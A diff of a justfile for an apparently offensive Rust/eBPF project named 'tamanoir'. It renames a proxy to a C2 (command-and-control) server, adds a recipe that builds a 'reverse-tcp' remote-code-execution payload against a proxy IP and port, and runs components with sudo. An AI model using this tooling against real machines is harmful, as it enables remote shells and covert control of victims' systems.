@@ -7,21 +7,20 @@ build-ebpf:
     cd tamanoir-ebpf && cargo build --release
 
 build-rce payload="hello":
-    cd tamanoir-rce &&  just build {{payload}}
-    cargo build -p tamanoir-rce --release
+    cd tamanoir-rce &&  just build {{payload}} && cargo build  --release
 
+run-rce:
+    cd tamanoir-rce && sudo -E target/release/tamanoir-rce
+
+build_reverse_shell proxy_ip="192.168.1.15" rce_port="8082":
+    IP=$(just _atoi {{proxy_ip}}) PORT={{rce_port}} just build-rce reverse-tcp
 
 
 # Build
-build proxy_ip="192.168.1.15" rce_port="8082":
+build:
     just build-ebpf
-    IP=$(just _atoi {{proxy_ip}}) PORT={{rce_port}} just build-rce reverse-tcp
-    cargo build -p tamanoir-proxy --release 
-    cargo build --release
-
-
-run-rce:
-    sudo -E target/release/tamanoir-rce
+    cargo build -p tamanoir-c2 --release 
+    cargo build -p tamanoir --release
 
 # Run
 run proxy_ip hijack_ip="8.8.8.8" layout="1" log_level="info":
@@ -29,7 +28,7 @@ run proxy_ip hijack_ip="8.8.8.8" layout="1" log_level="info":
 
 # Run the proxy
 proxy dns_ip="8.8.8.8" port="53" payload_len="8" log_level="info" :
-    RUST_LOG={{log_level}} sudo -E ./target/release/tamanoir-proxy  --port {{port}} --dns-ip {{dns_ip}} --payload-len {{payload_len}}
+    RUST_LOG={{log_level}} sudo -E ./target/release/tamanoir-c2  --port {{port}} --dns-ip {{dns_ip}} --payload-len {{payload_len}}
 
 _atoi ipv4_address:
 	#!/usr/bin/env bash
